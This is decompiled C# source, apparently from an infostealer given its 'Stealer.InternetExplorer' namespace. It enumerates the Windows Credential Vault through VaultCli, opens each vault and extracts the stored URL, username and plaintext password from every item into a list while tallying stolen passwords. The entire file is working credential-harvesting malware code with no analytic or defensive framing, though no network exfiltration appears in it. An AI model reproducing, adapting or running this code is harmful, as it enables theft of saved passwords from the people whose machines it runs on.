using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Stealer.InternetExplorer
{
	// Token: 0x02000018 RID: 24
	internal sealed class cPasswords
	{
		// Token: 0x0600007B RID: 123 RVA: 0x0000567C File Offset: 0x0000387C
		public static List<Password> Get()
		{
			List<Password> list = new List<Password>();
			Version version = Environment.OSVersion.Version;
			int major = version.Major;
			int minor = version.Minor;
			bool flag = major >= 6 && minor >= 2;
			Type type;
			if (flag)
			{
				type = typeof(VaultCli.VAULT_ITEM_WIN8);
			}
			else
			{
				type = typeof(VaultCli.VAULT_ITEM_WIN7);
			}
			int num = 0;
			IntPtr zero = IntPtr.Zero;
			int num2 = VaultCli.VaultEnumerateVaults(0, ref num, ref zero);
			bool flag2 = num2 != 0;
			if (flag2)
			{
				throw new Exception("[ERROR] Unable to enumerate vaults. Error (0x" + num2.ToString() + ")");
			}
			IntPtr intPtr = zero;
			Dictionary<Guid, string> dictionary = new Dictionary<Guid, string>();
			dictionary.Add(new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note");
			dictionary.Add(new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential");
			dictionary.Add(new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector");
			dictionary.Add(new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials");
			dictionary.Add(new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials");
			dictionary.Add(new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential");
			dictionary.Add(new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential");
			dictionary.Add(new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential");
			dictionary.Add(new Guid("00000000-0000-0000-0000-000000000000"), null);
			for (int i = 0; i < num; i++)
			{
				object obj = Marshal.PtrToStructure(intPtr, typeof(Guid));
				Guid guid = new Guid(obj.ToString());
				intPtr = (IntPtr)(intPtr.ToInt64() + (long)Marshal.SizeOf(typeof(Guid)));
				IntPtr zero2 = IntPtr.Zero;
				bool flag3 = dictionary.ContainsKey(guid);
				string text;
				if (flag3)
				{
					text = dictionary[guid];
				}
				else
				{
					text = guid.ToString();
				}
				num2 = VaultCli.VaultOpenVault(ref guid, 0U, ref zero2);
				bool flag4 = num2 != 0;
				if (flag4)
				{
					Console.WriteLine("Unable to open the following vault: " + text + ". Error: 0x" + num2.ToString());
				}
				else
				{
					int num3 = 0;
					IntPtr zero3 = IntPtr.Zero;
					num2 = VaultCli.VaultEnumerateItems(zero2, 512, ref num3, ref zero3);
					bool flag5 = num2 != 0;
					if (flag5)
					{
						Console.WriteLine("[ERROR] Unable to enumerate vault items from the following vault: " + text + ". Error 0x" + num2.ToString());
					}
					else
					{
						IntPtr intPtr2 = zero3;
						bool flag6 = num3 > 0;
						if (flag6)
						{
							for (int j = 1; j <= num3; j++)
							{
								object obj2 = Marshal.PtrToStructure(intPtr2, type);
								intPtr2 = (IntPtr)(intPtr2.ToInt64() + (long)Marshal.SizeOf(type));
								IntPtr zero4 = IntPtr.Zero;
								FieldInfo field = obj2.GetType().GetField("SchemaId");
								Guid guid2 = new Guid(field.GetValue(obj2).ToString());
								FieldInfo field2 = obj2.GetType().GetField("pResourceElement");
								IntPtr intPtr3 = (IntPtr)field2.GetValue(obj2);
								FieldInfo field3 = obj2.GetType().GetField("pIdentityElement");
								IntPtr intPtr4 = (IntPtr)field3.GetValue(obj2);
								IntPtr intPtr5 = IntPtr.Zero;
								bool flag7 = major >= 6 && minor >= 2;
								if (flag7)
								{
									FieldInfo field4 = obj2.GetType().GetField("pPackageSid");
									intPtr5 = (IntPtr)field4.GetValue(obj2);
									num2 = VaultCli.VaultGetItem_WIN8(zero2, ref guid2, intPtr3, intPtr4, intPtr5, IntPtr.Zero, 0, ref zero4);
								}
								else
								{
									num2 = VaultCli.VaultGetItem_WIN7(zero2, ref guid2, intPtr3, intPtr4, IntPtr.Zero, 0, ref zero4);
								}
								bool flag8 = num2 != 0;
								if (flag8)
								{
									Console.WriteLine("Error occured while retrieving vault item. Error: 0x" + num2.ToString());
								}
								else
								{
									object obj3 = Marshal.PtrToStructure(zero4, type);
									FieldInfo field5 = obj3.GetType().GetField("pAuthenticatorElement");
									IntPtr intPtr6 = (IntPtr)field5.GetValue(obj3);
									Password password = default(Password);
									object obj4 = cPasswords.<Get>g__GetVaultElementValue|0_0(intPtr3);
									bool flag9 = obj4 != null;
									if (flag9)
									{
										password.sUrl = obj4.ToString();
									}
									object obj5 = cPasswords.<Get>g__GetVaultElementValue|0_0(intPtr4);
									bool flag10 = obj5 != null;
									if (flag10)
									{
										password.sUsername = obj5.ToString();
									}
									object obj6 = cPasswords.<Get>g__GetVaultElementValue|0_0(intPtr6);
									bool flag11 = obj6 != null;
									if (flag11)
									{
										password.sPassword = obj6.ToString();
									}
									Counter.Passwords++;
									list.Add(password);
								}
							}
						}
					}
				}
			}
			return list;
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00005B78 File Offset: 0x00003D78
		[CompilerGenerated]
		internal static object <Get>g__GetVaultElementValue|0_0(IntPtr vaultElementPtr)
		{
			object obj = Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT));
			FieldInfo field = obj.GetType().GetField("Type");
			object value = field.GetValue(obj);
			IntPtr intPtr = (IntPtr)(vaultElementPtr.ToInt64() + 16L);
			switch ((int)value)
			{
			case 0:
			{
				object obj2 = Marshal.ReadByte(intPtr);
				return (bool)obj2;
			}
			case 1:
				return Marshal.ReadInt16(intPtr);
			case 2:
				return Marshal.ReadInt16(intPtr);
			case 3:
				return Marshal.ReadInt32(intPtr);
			case 4:
				return Marshal.ReadInt32(intPtr);
			case 5:
				return Marshal.PtrToStructure(intPtr, typeof(double));
			case 6:
				return Marshal.PtrToStructure(intPtr, typeof(Guid));
			case 7:
			{
				IntPtr intPtr2 = Marshal.ReadIntPtr(intPtr);
				return Marshal.PtrToStringUni(intPtr2);
			}
			case 12:
			{
				IntPtr intPtr3 = Marshal.ReadIntPtr(intPtr);
				SecurityIdentifier securityIdentifier = new SecurityIdentifier(intPtr3);
				return securityIdentifier.Value;
			}
			}
			return null;
		}
	}
}
